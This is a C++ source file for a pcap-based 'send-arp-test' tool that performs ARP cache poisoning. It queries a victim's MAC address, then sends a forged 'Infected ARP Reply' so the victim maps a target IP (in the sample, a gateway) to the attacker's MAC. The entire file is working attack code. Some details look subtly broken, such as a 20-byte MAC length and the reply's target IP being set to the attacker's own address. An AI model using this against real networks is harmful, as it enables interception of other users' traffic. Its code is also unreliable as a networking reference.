#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <libnet.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

// Length
#define MAC_ALEN 20
#define IP_ALEN 20

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender-ip> <target-ip>\n");
    printf("sample: send-arp-test wlan0 192.168.55.4 192.168.55.1\n");
}

int GetInterfaceIPAddress(const char *ifname, char *ip_addr){
    struct ifreq ifr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0){
        printf("Fail to get interface IP - socket() failed - %m\n");
        return -1;
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP - ioctl(SIOSCIFHWARDDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_addr,sizeof(struct sockaddr));

    close(sockfd);
    return 0;
}

int GetInterfaceMACAddress(const char *ifname, uint8_t *mac_addr){
    struct ifreq ifr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0){
        printf("Fail to get interface MAC - socket() failed - %m\n");
        return -1;
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0){
        printf("Fail to get interface MAC - ioctl(SIOSCIFHWARDDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

    close(sockfd);
    return 0;
}

int GetInterfaceMACAddress_you(const u_char* reply_packet, uint8_t *mac_addr){
    struct libnet_ethernet_hdr* ETH = (struct libnet_ethernet_hdr *) reply_packet;
    int i = 0;

    for (i = 0; i < 6; i++) mac_addr[i] = ETH->ether_shost[i];

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    // Attacker's MAC address
    uint8_t me_MAC[MAC_ALEN];
    char me_MACstr[MAC_ALEN];
    // Attacker's IP address
    char me_IP[IP_ALEN];
    // Sender's MAC address
    uint8_t you_MAC[MAC_ALEN];
    char you_MACstr[MAC_ALEN];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

    GetInterfaceMACAddress(argv[1], me_MAC);
    sprintf(me_MACstr, "%02X:%02X:%02X:%02X:%02X:%02X", me_MAC[0], me_MAC[1], me_MAC[2], me_MAC[3], me_MAC[4], me_MAC[5]);
    GetInterfaceIPAddress(argv[1], me_IP);

    // ARP Request
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(me_MACstr);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(me_MACstr);
    packet.arp_.sip_ = htonl(Ip(me_IP));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // Catched reply packet
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    res = pcap_next_ex(handle, &header, &reply_packet);
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        return -1;
    }

    // Parsing sender's MAC address
    GetInterfaceMACAddress_you(reply_packet, you_MAC);
    sprintf(you_MACstr, "%02X:%02X:%02X:%02X:%02X:%02X", you_MAC[0], you_MAC[1], you_MAC[2], you_MAC[3], you_MAC[4], you_MAC[5]);

    // Infected ARP Reply
    packet.eth_.dmac_ = Mac(you_MACstr);
    packet.eth_.smac_ = Mac(me_MACstr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(me_MACstr);
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = Mac(you_MACstr);
    packet.arp_.tip_ = htonl(Ip(me_IP));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
